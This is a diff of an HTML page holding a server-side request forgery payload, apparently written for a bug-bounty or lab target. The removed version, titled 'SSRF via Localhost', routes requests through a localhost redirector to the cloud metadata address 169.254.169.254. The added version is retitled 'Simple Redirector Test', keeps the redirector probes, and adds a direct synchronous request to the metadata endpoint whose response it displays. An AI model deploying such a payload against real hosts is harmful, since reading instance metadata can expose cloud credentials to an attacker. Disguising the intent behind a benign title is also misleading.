@@ -1,34 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF via Localhost</title>
+    <title>Simple Redirector Test</title>
 </head>
 <body>
-    <h1>SSRF Test via Localhost</h1>
-    <div id="test1"></div>
-    <div id="test2"></div>
-    <div id="error"></div>
+    <h1>Testing Basic Redirector Access</h1>
+    <div id="results"></div>
     
     <script>
+        var results = "";
+        
+        // Test 1: Can we access the redirector to get Google?
         try {
-            // Test 1: Basic redirector access via localhost (like original writeup)
+            results += "<h2>Test 1: Redirector to Google</h2>";
             var xhr1 = new XMLHttpRequest();
             xhr1.open('GET', 'http://localhost/redir.php?url=https://www.google.com', false);
             xhr1.send();
-            document.getElementById("test1").innerHTML = 
-                "<h2>✅ Redirector via localhost:</h2><pre>" + xhr1.responseText.substring(0, 500) + "...</pre>";
-            
-            // Test 2: If that works, try metadata service via redirector
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open('GET', 'http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/', false);
-            xhr2.send();
-            document.getElementById("test2").innerHTML = 
-                "<h2>✅ Metadata via redirector:</h2><pre>" + xhr2.responseText + "</pre>";
-                
-        } catch(err) {
-            document.getElementById('error').innerHTML = 
-                "<h2>❌ Error:</h2>" + err.message;
+            results += "<div style='background:#e8f5e8;padding:10px;'>SUCCESS: " + xhr1.responseText.length + " bytes received</div>";
+            results += "<div style='font-size:10px;max-height:200px;overflow:scroll;'>" + xhr1.responseText.substring(0, 1000) + "...</div>";
+        } catch(e) {
+            results += "<div style='background:#ffe8e8;padding:10px;'>ERROR: " + e.message + "</div>";
         }
+        
+        // Test 2: Can we access redirector to get a simple endpoint?
+        try {
+            results += "<h2>Test 2: Redirector to httpbin.org</h2>";
+            var xhr2 = new XMLHttpRequest();
+            xhr2.open('GET', 'http://localhost/redir.php?url=http://httpbin.org/get', false);
+            xhr2.send();
+            results += "<div style='background:#e8f5e8;padding:10px;'>SUCCESS: " + xhr2.responseText.length + " bytes received</div>";
+            results += "<div style='font-size:10px;'>" + xhr2.responseText + "</div>";
+        } catch(e) {
+            results += "<div style='background:#ffe8e8;padding:10px;'>ERROR: " + e.message + "</div>";
+        }
+        
+        // Test 3: Try direct metadata access (no redirector)
+        try {
+            results += "<h2>Test 3: Direct Metadata Access</h2>";
+            var xhr3 = new XMLHttpRequest();
+            xhr3.open('GET', 'http://169.254.169.254/latest/meta-data/', false);
+            xhr3.send();
+            results += "<div style='background:#e8f5e8;padding:10px;'>SUCCESS: " + xhr3.responseText + "</div>";
+        } catch(e) {
+            results += "<div style='background:#ffe8e8;padding:10px;'>ERROR: " + e.message + "</div>";
+        }
+        
+        document.getElementById("results").innerHTML = results;
     </script>
 </body>
 </html>
